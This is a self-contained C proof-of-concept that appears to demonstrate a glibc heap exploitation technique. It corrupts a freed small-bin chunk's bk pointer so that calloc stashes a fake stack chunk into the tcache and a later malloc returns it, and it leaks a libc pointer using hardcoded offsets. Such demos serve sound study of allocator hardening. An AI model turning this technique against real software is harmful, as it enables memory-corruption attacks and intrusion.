#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
size_t getheap()
{
    puts("getheap");
    size_t libc_addr=puts-0x70970;
    size_t* mp_72=libc_addr+0x3b62c8;
    size_t heap=*mp_72;
    return heap;
}
int main()
{    
    size_t* chunkarray[0x10];
    for(int i=0;i<7;i++)
    {
        chunkarray[i]=malloc(0x80);
    }
    size_t* chunk1=malloc(0x80);
    malloc(0x10);  //prevent  merge
    size_t* chunk2=malloc(0x80);
    malloc(0x10);  //prevent  merge
    for(int i=0;i<7;i++)
    {
        free(chunkarray[i]);
    }
    free(chunk1);
    free(chunk2);


    malloc(0x90);

    for(int i=0;i<2;i++)
    {
        chunkarray[i]=malloc(0x80);
    }

    size_t fakechunk1[0x20];
    size_t fakechunk2[0x20];
    chunk2[1]=fakechunk1;  //bk
    fakechunk1[3]=fakechunk2;   // bk->bk->fd = unsorted bin libc and bk can be written

    size_t* chunk3=calloc(1, 0x80);
    
    size_t* chunk4=malloc(0x80);
    printf("fakechunk1 %p\n",fakechunk1);
    printf("fakechunk1 enter tcache fakechunk1[2] %p\n",fakechunk1[2]);
    printf("fakechunk2 in smallbin fd = unsortedbin libc fakechunk2[2] %p\n",fakechunk2[2]);   //write fakechunk2->fd libc 
    printf("malloc(0x80) chunk4 %p\n",chunk4);
    

}